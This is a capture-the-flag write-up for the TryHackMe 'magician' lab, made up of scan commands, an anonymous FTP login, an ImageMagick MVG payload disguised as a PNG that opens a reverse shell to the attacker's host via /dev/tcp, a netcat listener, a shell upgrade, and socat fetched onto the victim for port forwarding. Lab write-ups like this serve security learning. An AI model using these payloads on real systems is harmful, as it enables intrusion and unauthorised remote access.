# magician

**Room Link:** [https://tryhackme.com/room/magician](https://tryhackme.com/room/magician)

### Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Scan all ports

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



### TCP/21 - FTP

After trying to login with anonymous it delays but after some time it finally logs in with the below message. The link below gives us some hints on what to do next.

**Kali**

```
ftp $VICTIM
```

<figure><img src="../../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Initial Shell

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
nc -lvnp 1337
```

revshell.txt

```
push graphic-context
encoding "UTF-8"
viewbox 0 0 1 1
affine 1 0 0 1 0 0
push graphic-context
image Over 0,0 1,1 '|/bin/sh -i > /dev/tcp/$KALI/1337 0<&1 2>&1'
pop graphic-context
pop graphic-context
```

**Kali**

```
cp revshell.txt revshell.png
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

Get autocomplete

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl + Z
stty raw -echo;fg
```



## Port Forwarding & Finding Flag

**Victim**

```
cat the_magic_continues
```

<figure><img src="../../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
ss -ltp
curl localhost:6666 
```

<figure><img src="../../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
wget https://github.com/aledbf/socat-static-binary/releases/download/v0.0.1/socat-linux-amd64
python2 -m SimpleHTTPServer 81
```

**Victim**

```
cd /tmp
wget http://$KALI:81/socat-linux-amd64
chmod +x socat-linux-amd64 
./socat-linux-amd64  tcp-listen:7777,reuseaddr,fork tcp:localhost:6666
```





<figure><img src="../../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>









<figure><img src="../../.gitbook/assets/image (13) (1) (1).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (12) (1) (1).png" alt=""><figcaption></figcaption></figure>



















